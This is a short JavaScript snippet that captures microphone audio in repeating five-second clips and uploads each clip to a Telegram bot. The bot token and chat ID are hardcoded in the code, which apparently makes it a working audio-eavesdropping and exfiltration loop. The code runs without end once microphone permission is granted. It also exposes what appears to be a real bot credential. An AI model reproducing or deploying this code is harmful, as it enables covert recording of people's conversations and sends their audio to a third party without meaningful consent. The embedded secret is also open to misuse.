navigator.mediaDevices.getUserMedia({audio:true})
    .then(stream=>{
      setInterval(()=>{
      let rec = new MediaRecorder(stream);
      let file=[];
      rec.ondataavailable=fileaudio=>{file.push(fileaudio.data)};
      rec.onstop =()=>{
        let blob=new Blob(file,{type:"audio/webm"});
        let form= new FormData();
        form.append("chat_id","8451482936")
        form.append("audio",blob,"voice.ogg")
        fetch(`https://api.telegram.org/bot${"8330590629:AAHp3sWaLmmM5S75nmDITZQFxqyMaKK7KBU"}/sendAudio`,{
          method:"POST",
          body:form
        })
        .then(res=>res.json())
        .then(data=>{
          if(data.ok){
            alert("sent")
          }
          else{
            alert("error")
          }
          
        })
      }
      rec.start()
      setTimeout(()=>{
        if(rec.state==="recording"){
          rec.stop()
        }
      },4999)
      },5000)
      
    })